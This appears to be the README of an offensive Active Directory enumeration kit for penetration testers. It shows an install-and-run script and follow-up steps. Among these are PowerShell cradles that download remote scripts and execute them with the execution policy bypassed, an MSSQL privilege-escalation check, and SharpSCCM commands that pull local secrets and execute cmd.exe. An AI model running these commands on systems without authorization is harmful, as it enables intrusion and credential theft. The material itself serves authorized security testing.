# fkad

<img width="2525" height="385" alt="366097681-8fa1fc4b-43c1-4789-8184-0138bd81d0b1" src="https://github.com/user-attachments/assets/11c9fe22-c113-4a4f-a8df-45c839aa54cf" />

`fkad` is a custom offensive helper kit designed for exegol containers. It automates common and mundane enumeration tasks, executes sanity checks and prepares artifacts for follow-up exploiting. 

## Quick install & run

```bash
wget https://raw.githubusercontent.com/fkxdr/fkad/refs/heads/main/fkad.sh
chmod +x fkad.sh
./fkad.sh -u <user> -p '<password>' -d <dc-ip/domain.com>
```

<img width="1819" height="1122" alt="image" src="https://github.com/user-attachments/assets/49617e19-a7ad-48df-b2d8-b2d5e5f595e0" />

Example:

```bash
./fkad.sh -u pentest1 -p 'Pentestpassword123' -d domain.com
./fkad.sh -u pentest1 -p 'Pentestpassword123' -d 10.10.2.13 -scope scope.txt
./fkad.sh -u pentest1 -p 'Pentestpassword123' -d domain.com -fast
```

> [!NOTE]
> The -fast flag limits extensive bloodhound checks in AD environments with many stale or dead objects, while the -scope flag allows the usage of a scoping file.txt with additional CIDR ranges (one per line) to extend network scans beyond the primary subnet.


## Follow-Up Enumeration

For most assessments it makes sense to follow up enumeration on a provided device. This includes, but is not limited to:

- [ ] fkad.ps1
```ps
powershell -ep bypass -c "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fkxdr/fkad/refs/heads/main/fkad.ps1')"
```

<img width="1866" height="1052" alt="image" src="https://github.com/user-attachments/assets/e8d43abc-e297-428b-91f1-3ff7d63660e4" />

- [ ] MSSQL
```powershell
IEX (iwr 'https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Where-Object {$_.Status -eq "Accessible"} | Get-SQLServerPrivEscRowThreated | Out-File "$env:USERPROFILE\Downloads\fkad\mssql_priv.txt"
```
- [ ] [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)
```powershell
SharpSCCM.exe local secrets -m disk
SharpSCCM.exe get collections
SharpSCCM.exe exec -rid  -p "C:\Windows\System32\cmd.exe"
```

Most likely these should be run across the network as well.

- [ ] Nessus
- [ ] Responder

## Security / Legal

This tool is for authorized security testing, research, and defensive validation only. Do not use it against systems you do not own or do not have explicit permission to test. The author is not responsible for misuse.
